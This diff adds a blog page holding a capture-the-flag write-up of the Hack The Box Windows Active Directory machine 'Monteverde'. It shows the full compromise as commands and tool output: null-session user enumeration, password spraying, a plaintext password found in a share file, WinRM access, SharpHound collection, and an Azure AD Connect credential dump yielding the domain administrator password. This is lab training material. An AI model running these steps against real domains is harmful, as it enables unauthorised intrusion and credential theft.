@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Monteverde | Paracausal Telemetry</title><meta name="description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Access as SABatchJobs." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-monteverde/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Monteverde" /><meta property="og:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Access as SABatchJobs." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-monteverde/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-monteverde/og.png?v=e1171774" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Monteverde" /><meta name="twitter:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Access as SABatchJobs." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-monteverde/og.png?v=e1171774" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Monteverde","description":"Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Access as SABatchJobs.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-monteverde/","datePublished":"2026-05-18","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Monteverde","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-monteverde/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Monteverde</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-05-18 · 11 min read</p><h1>Monteverde</h1><p>Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Access as SABatchJobs.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · medium</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Monteverde" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-monteverde.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head"><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Monteverde</h2></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div></dl><p class="room-link"><a href="https://app.hackthebox.com/machines/Monteverde" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.35.54 --generate-hosts-file /etc/hosts  
+[sudo] password for kali: 
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.35.54                                                                  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 18:18 +0100
+Nmap scan report for 10.129.35.54
+Host is up (0.013s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49666/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49676/tcp open  unknown
+49696/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.27 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT monteverde.megabank.local
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 18:21 +0100
+Nmap scan report for monteverde.megabank.local (10.129.35.54)
+Host is up (0.087s latency).
+rDNS record for 10.129.35.54: MONTEVERDE.MEGABANK.LOCAL
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-18 17:21:47Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><h3>Null authentication</h3><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u &#39;&#39; -p &#39;&#39; --users-export users.txt
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
+SMB         10.129.35.54    445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.35.54    445    MONTEVERDE       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.35.54    445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+SMB         10.129.35.54    445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
+SMB         10.129.35.54    445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
+SMB         10.129.35.54    445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
+SMB         10.129.35.54    445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
+SMB         10.129.35.54    445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
+SMB         10.129.35.54    445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
+SMB         10.129.35.54    445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
+SMB         10.129.35.54    445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
+SMB         10.129.35.54    445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
+SMB         10.129.35.54    445    MONTEVERDE       [*] Writing 10 local users to users.txt</code></pre><p>I have dumped all the user to a file using null authentication, but im not able to use null auth to access shares!</p><p>Also the guest account is disabled!</p><p>AS-REP roasting gave me no results!</p><h2>Password spray leads to user compromise</h2><p>There is no lockout set on this domain! So i can perform some password spraying</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u users.txt -p users.txt --continue-on-success
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:Guest STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+
+...[SNIP]...</code></pre><p>I have compromised the user <code>SABatchJobs</code></p><h2>Access as <code>SABatchJobs</code></h2><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u SABatchJobs -p &#39;SABatchJobs&#39; --shares       
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+SMB         10.129.35.54    445    MONTEVERDE       [*] Enumerated shares
+SMB         10.129.35.54    445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.129.35.54    445    MONTEVERDE       -----           -----------     ------
+SMB         10.129.35.54    445    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.129.35.54    445    MONTEVERDE       azure_uploads   READ            
+SMB         10.129.35.54    445    MONTEVERDE       C$                              Default share
+SMB         10.129.35.54    445    MONTEVERDE       E$                              Default share
+SMB         10.129.35.54    445    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.129.35.54    445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.129.35.54    445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.129.35.54    445    MONTEVERDE       users$          READ</code></pre><p>The <code>azure_uploads</code> share is empty</p><h4><code>users$</code> share</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //monteverde.megabank.local/users$ -U &#39;SABatchJobs&#39;%&#39;SABatchJobs&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Jan  3 13:12:48 2020
+  ..                                  D        0  Fri Jan  3 13:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 13:12:30 2020
+  mhope                               D        0  Fri Jan  3 13:41:18 2020
+  roleary                             D        0  Fri Jan  3 13:10:30 2020
+  smorgan                             D        0  Fri Jan  3 13:10:24 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: \&gt;</code></pre><p>3 of the directories were empty but <code>mhope</code> had a azure.xml file in here dir</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat azure.xml 
+��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
+  &lt;Obj RefId=&quot;0&quot;&gt;
+    &lt;TN RefId=&quot;0&quot;&gt;
+      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;</code></pre><p>Looks like ive found a password!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">4n0therD4y@n0th3r$</code></pre><p>I can spray this password against all the users!</p><h2>Compromising <code>mhope</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u users.txt -p &#39;4n0therD4y@n0th3r$&#39; --continue-on-success
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.35.54    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE</code></pre><p>I have compromised the user <code>mhope</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc winrm monteverde.megabank.local -u mhope -p &#39;4n0therD4y@n0th3r$&#39;         
+WINRM       10.129.35.54    5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) 
+WINRM       10.129.35.54    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)</code></pre><p>This user has access over WINRM</p><p>This user has no extra access on SMB</p><h2>Bloodhound </h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; upload SharpHound.exe
+                                        
+Info: Uploading /home/kali/htb/Monteverde/SharpHound.exe to C:\Users\mhope\Documents\SharpHound.exe
+                                        
+Data: 1802240 bytes of 1802240 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; dir
+
+
+    Directory: C:\Users\mhope\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/18/2026  11:22 AM        1351680 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; .\SharpHound.exe -c All</code></pre><p>Ill upload sharphound and grab the bloodhound data</p><p><img src="images/monteverde/pasted-image-20260518192902.webp" alt="Screenshot" loading="lazy" /></p><p>This user is apart of the azure admins group</p><h2>Domain admin</h2><p><a href="https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/blob/main/decrypt.ps1" target="_blank" rel="noreferrer">https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/blob/main/decrypt.ps1</a></p><p>After searching the file system more i see something interesting in the program files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; dir ../../../&#39;Program Files&#39;
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2020   9:36 PM                Common Files
+d-----         1/2/2020   2:46 PM                internet explorer
+d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
+d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
+d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
+d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
+d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
+
+...[SNIP]...</code></pre><p>I see that Azure AD Connect is installed, from past experience i was aware of this attack path!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; .\azure-creds.ps1
+Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
+Error connecting to SQL database. Trying next...
+Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
+Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
+Connection successful!
+Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt;</code></pre><p>Using the tool from github i found listed earlier i can dump the credentials of the administrator!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u Administrator -p &#39;d0m@in4dminyeah!&#39;
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u Administrator -p &#39;d0m@in4dminyeah!&#39; -X &#39;whoami&#39;
